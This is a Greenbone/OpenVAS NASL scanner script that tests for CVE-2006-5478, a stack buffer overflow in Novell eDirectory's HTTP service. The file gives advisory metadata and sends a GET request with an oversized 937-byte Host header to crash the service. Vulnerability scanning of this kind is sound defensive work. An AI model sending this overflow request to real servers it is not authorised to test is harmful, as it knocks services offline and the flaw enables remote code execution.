# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802674");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2006-5478");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-10-08 19:32:57 +0530 (Mon, 08 Oct 2012)");
  script_name("Novell eDirectory Multiple Stack Based Buffer Overflow Vulnerabilities");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_dependencies("novell_edirectory_detect.nasl", "gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8028);
  script_mandatory_keys("eDirectory/installed", "DHost/banner");

  script_xref(name:"URL", value:"http://secunia.com/advisories/22519");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/20655");
  script_xref(name:"URL", value:"http://securitytracker.com/id?1017125");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-06-035/");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-06-036/");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary
  code and deny the server.");

  script_tag(name:"affected", value:"Novell eDirectory 8.8.x to 8.8.1, and 8.x to 8.7.3.8 (8.7.3 SP8)");

  script_tag(name:"insight", value:"The flaws are due to improper validation of user-supplied input via
  a long HTTP Host header, which triggers an overflow in the BuildRedirectURL
  function.");

  script_tag(name:"solution", value:"Upgrade to Novell eDirectory version 8.8.1 FTF1 or 8.7.3.9 (8.7.3 SP9)");

  script_tag(name:"summary", value:"Novell eDirectory is prone to multiple multiple stack based buffer overflow vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://www.novell.com/support/kb/doc.php?id=3723994");
  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port( default:8028 );
banner = http_get_remote_headers( port:port );

if( ! banner || ! egrep( pattern:"^Server: DHost\/[0-9\.]+ HttpStk\/[0-9\.]+", string:banner ) )
  exit( 0 );

req = string( "GET /nds HTTP/1.1\r\n",
              "Host: ", crap(length:937,data:"A"),
              "\r\n\r\n" );
http_send_recv( port:port, data:req );

if( http_is_dead( port:port, retry:2 ) ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
